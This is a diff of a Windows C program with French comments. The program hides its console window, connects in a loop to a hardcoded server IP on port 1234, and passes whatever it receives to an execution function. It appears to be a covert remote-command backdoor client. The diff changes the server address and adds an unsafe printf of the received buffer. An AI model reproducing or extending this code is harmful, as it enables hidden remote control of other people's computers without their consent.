@@ -8,7 +8,7 @@ int main()
 {  
   
 HWND myWindows = GetConsoleWindow();
-ShowWindow(myWindows, SW_HIDE);
+ShowWindow(myWindows, SW_HIDE); 
     while (1) {
 
 WSADATA wsa;
@@ -28,7 +28,7 @@ WSADATA wsa;
     SOCKADDR_IN serverAddr;
     serverAddr.sin_family = AF_INET;
     serverAddr.sin_port = htons(1234);  // Port du serveur
-    serverAddr.sin_addr.s_addr = inet_addr("192.168.206.130");  // Adresse IP du serveur
+    serverAddr.sin_addr.s_addr = inet_addr("192.168.191.141");  // Adresse IP du serveur
 
     // Connexion au serveur
     if (connect(sock, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
@@ -41,7 +41,9 @@ WSADATA wsa;
     int bytesReceived = recv(sock, buffer, sizeof(buffer), 0);
     if (bytesReceived > 0) {
         buffer[bytesReceived] = '\0';  // Ajouter le caractère de fin de chaîne
-        ft_exec(buffer);  // Appeler la fonction ft_exec avec le message reçu
+        printf(buffer);
+        Sleep(3000);
+        ftexec(buffer);  // Appeler la fonction ft_exec avec le message reçu
     } else {
         printf("Erreur lors de la réception du message du serveur\n");
     }
